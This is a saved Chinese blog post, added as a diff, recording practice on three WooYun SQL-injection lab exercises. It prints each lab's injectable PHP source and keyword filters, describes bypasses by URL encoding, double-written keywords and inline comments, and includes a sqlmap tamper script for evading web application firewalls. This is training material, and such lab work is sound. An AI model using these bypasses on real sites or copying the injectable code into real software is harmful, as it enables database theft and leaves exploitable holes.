@@ -1,0 +1,664 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>Wooyun 靶场练习记录-01 | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">Wooyun 靶场练习记录-01</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-26 15:40:13" itemprop="datePublished" pubdate="">2020-02-26</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h2 id="0x01-准备">0x01 准备</h2>
+<h4 id="环境">环境:</h4>
+<p>| <strong>浏览器</strong>   | <code>Firefox</code> |</p>
+<!-- more -->
+<p>| ------------ | --------- |<br>
+| <strong>插件</strong>     | <code>HackBar</code> |<br>
+| <strong>运行方式</strong> | <code>Docker</code>  |</p>
+<h3 id="运行命令">运行命令:</h3>
+<figure data-type="image" tabindex="1"><img src="https://s2.ax1x.com/2020/02/22/3M2QrF.png" alt="3M2QrF.png" loading="lazy"></figure>
+<h2 id="0x02-题目">0x02 题目</h2>
+<h3 id="wooyun-2014-61361-sqli-query_string">WooYun-2014-61361  Sqli Query_STRING</h3>
+<p>​	注入题,测了下闭合方式,发现没有闭合... 测试发现构造SQL语句时,内部会有一些过滤,大致测试后常</p>
+<p>用,<code>SELECT</code> <code>and</code> <code>UNION</code> <code>ORDER BY</code> <code>GOUP_CONCAT</code>等常用函数都过滤了..换个思路</p>
+<p>试着用<code>like</code>代替 <code>AND</code>测一下回显,<strong>构造:</strong></p>
+<p><strong>条件为真: 1 like 1&gt;0</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://s2.ax1x.com/2020/02/22/3MWpnS.png" alt="3MWpnS.png" loading="lazy"></figure>
+<p><strong>条件为假: 1 like 1&gt;2</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://s2.ax1x.com/2020/02/22/3MWYjK.png" alt="3MWYjK.png" loading="lazy"></figure>
+<p><strong>存在注入!</strong></p>
+<h3 id="代码">代码:</h3>
+<pre><code class="language-php">WooYun-2014-61361 Source
+&lt;?php    
+
+if(isset($_GET['Submit'])){
+    
+    // Retrieve data
+    
+    inject_check(strtolower($_SERVER['QUERY_STRING']));
+
+    $id = $_GET['id'];
+
+    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;
+    $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i &lt; $num) {
+
+        $first = mysql_result($result,$i,&quot;first_name&quot;);
+        $last = mysql_result($result,$i,&quot;last_name&quot;);
+        
+        echo '&lt;pre&gt;';
+        echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last;
+        echo '&lt;/pre&gt;';
+
+        $i++;
+    }
+}
+
+function inject_check($str) { //防注入函数开始
+    $check=preg_match('/select|order|insert|update|eval|document|delete|injection|jection|link|and|or|from|union|into|load_file|outfile|&lt;script&gt;/',$str);
+    if($check){
+        echo &quot;&lt;script&gt;alert('Filtered!!!');window.history.go(-1);&lt;/script&gt;&quot;;
+        exit();
+    }else{
+        return $str;
+    }
+}    
+
+//上面直接用GET参数拼接了SQL导致注入,过滤函数过滤了多数常用函数
+//思路: 试着URL编码绕过试一下
+
+?&gt;
+</code></pre>
+<p>将SQL语句URL编码后,测试一下能不能构造联合查询,先判断列数,3列时候报错,说明数据共2列:</p>
+<figure data-type="image" tabindex="4"><img src="https://s2.ax1x.com/2020/02/22/3Mfra4.png" alt="3Mfra4.png" loading="lazy"></figure>
+<p>构造联合查询,看一下显示位数:</p>
+<figure data-type="image" tabindex="5"><img src="https://s2.ax1x.com/2020/02/22/3Mf8aQ.png" alt="3Mf8aQ.png" loading="lazy"></figure>
+<p>貌似有显示位,看一下库名,但是又存在问题了,函数没有执行,原样输出了!!:</p>
+<figure data-type="image" tabindex="6"><img src="https://s2.ax1x.com/2020/02/22/3MfXsf.png" alt="3MfXsf.png" loading="lazy"></figure>
+<p>那就直接上SQLmap吧,记得SQLmap自带Tamper有URL编码的脚本:</p>
+<figure data-type="image" tabindex="7"><img src="https://s2.ax1x.com/2020/02/22/3M42DK.png" alt="3M42DK.png" loading="lazy"></figure>
+<p>结果如下:</p>
+<figure data-type="image" tabindex="8"><img src="https://s2.ax1x.com/2020/02/22/3M46jx.png" alt="3M46jx.png" loading="lazy"></figure>
+<h3 id="wooyun-2014-53384-sqli-fiter">WooYun-2014-53384 Sqli fiter</h3>
+<h3 id="代码-2">代码</h3>
+<pre><code class="language-php">WooYun-2014-53384 Source
+&lt;?php    
+
+if(isset($_GET['Submit'])){
+    
+    // Retrieve data
+    
+    $id = $_GET['id'];
+
+    $id = tsFilter($id);
+
+    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id'&quot;;
+    $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i &lt; $num) {
+
+        $first = mysql_result($result,$i,&quot;first_name&quot;);
+        $last = mysql_result($result,$i,&quot;last_name&quot;);
+        
+        echo '&lt;pre&gt;';
+        echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last;
+        echo '&lt;/pre&gt;';
+
+        $i++;
+    }
+}
+
+
+// 思路:
+// 主要看过滤函数了,tsFilter函数是将传入的SQL函数参数替换为空
+// 可以双写SQL函数进行绕过
+
+function tsFilter($value){
+    $value = trim($value);
+    //定义不允许提交的SQl命令和关键字
+    $words = array();
+    $words[] = &quot;add &quot;;
+    $words[] = &quot;and &quot;;
+    $words[] = &quot;count &quot;;
+    $words[] = &quot;order &quot;;
+    $words[] = &quot;table &quot;;
+    $words[] = &quot;by &quot;;
+    $words[] = &quot;create &quot;;
+    $words[] = &quot;delete &quot;;
+    $words[] = &quot;drop &quot;;
+    $words[] = &quot;from &quot;;
+    $words[] = &quot;grant &quot;;
+    $words[] = &quot;insert &quot;;
+    $words[] = &quot;select &quot;;
+    $words[] = &quot;truncate &quot;;
+    $words[] = &quot;update &quot;;
+    $words[] = &quot;use &quot;;
+    $words[] = &quot;--&quot;;
+    $words[] = &quot;#&quot;;
+    $words[] = &quot;group_concat&quot;;
+    $words[] = &quot;column_name&quot;;
+    $words[] = &quot;information_schema.columns&quot;;
+    $words[] = &quot;table_schema&quot;;
+    $words[] = &quot;union &quot;;
+    $words[] = &quot;where &quot;;
+    $words[] = &quot;alert&quot;;
+    $value = strtolower($value);//转换为小写
+    foreach($words as $word){
+        if(strstr($value,$word)){
+            $value = str_replace($word,'',$value);
+        }
+    }
+    
+    return $value;
+}
+?&gt;
+</code></pre>
+<h2 id="构造联合查询发现没有显示位sqlmap利用脚本">构造联合查询,发现没有显示位,SQLmap,利用脚本:</h2>
+<figure data-type="image" tabindex="9"><img src="https://s2.ax1x.com/2020/02/22/3MqmT0.png" alt="3MqmT0.png" loading="lazy"></figure>
+<h3 id="结果">结果:</h3>
+<figure data-type="image" tabindex="10"><img src="https://s2.ax1x.com/2020/02/22/3MqCY8.png" alt="3MqCY8.png" loading="lazy"></figure>
+<h3 id="wooyun-2014-52257-mysql">WooYun-2014-52257 Mysql</h3>
+<h4 id="代码-3">代码:</h4>
+<pre><code class="language-php">WooYun-2014-52257 Source
+&lt;?php    
+
+if(isset($_GET['Submit'])){
+    
+    // Retrieve data
+    
+    $id = $_GET['id'];
+    $id = trim(strtolower($id));
+
+    $test = _do_query_safe($id);
+
+    if($test != 1)
+    {
+        die('SQLi detected!');
+    }
+
+    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;
+    $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i &lt; $num) {
+
+        $first = mysql_result($result,$i,&quot;first_name&quot;);
+        $last = mysql_result($result,$i,&quot;last_name&quot;);
+        
+        echo '&lt;pre&gt;';
+        echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last;
+        echo '&lt;/pre&gt;';
+
+        $i++;
+    }
+}
+
+    function _do_query_safe($sql) {
+
+        $sql = preg_replace('/\/\*.*\*\//','',$sql);    
+        if(strstr($sql,&quot;select&quot;))
+        {
+            return -1;
+        }
+        
+        return 1;    
+    }
+
+?&gt;
+    
+	 // 过滤函数是通过正则来匹配关键字
+	//  直接构造内敛注释绕过就可以
+    //   因为以前写的过狗Tamper也差不多都是,内部字符加内敛注释
+</code></pre>
+<pre><code class="language-python"># BypassDog-Tamper
+#!/usr/bin/env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+&quot;&quot;&quot;
+
+import os
+import re
+
+from lib.core.common import singleTimeWarnMessage
+from lib.core.data import kb
+from lib.core.enums import DBMS
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.HIGHER
+
+def dependencies():
+    singleTimeWarnMessage(&quot;tamper script '%s' is only meant to be run against %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Encloses each non-function keyword with versioned MySQL comment
+
+    Requirement:
+        * MySQL
+
+    Tested against:
+        * MySQL 4.0.18, 5.1.56, 5.5.11
+
+    Notes:
+        * Useful to bypass several web application firewalls when the
+          back-end database management system is MySQL
+
+    &gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
+    &quot;&quot;&quot;
+
+    def process(match):
+        word = match.group('word')
+        if word.upper() in kb.keywords:
+            return match.group().replace(word, &quot;/*!/*!%s*/&quot; % word)
+        else:
+            return match.group()
+
+    retVal = payload
+
+    if payload:
+        retVal = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=[^\w(]|\Z)&quot;, lambda match: process(match), retVal)
+        retVal = retVal.replace(&quot; /*!/*!&quot;, &quot;/*!/*!&quot;).replace(&quot;*/ &quot;, &quot;*/&quot;).replace(&quot;()&quot;,&quot;/*!/*!()*/*&quot;)
+
+    return retVal
+
+
+
+
+
+
+
+
+
+</code></pre>
+<p><strong>同理,内敛注释绕过!</strong></p>
+<h3 id="结果-2">结果:</h3>
+<figure data-type="image" tabindex="11"><img src="https://s2.ax1x.com/2020/02/26/3UQLUx.png" alt="3UQLUx.png" loading="lazy"></figure>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		<div class="wow bounceInLeft nav-previous3"><a href="https://loecho.me/otcXOSew_/" rel="prev"> 垃圾数据混淆流量BypassWAF</a></div>
+		 
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/php02/" rel="next"> PHP代码审计-02</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
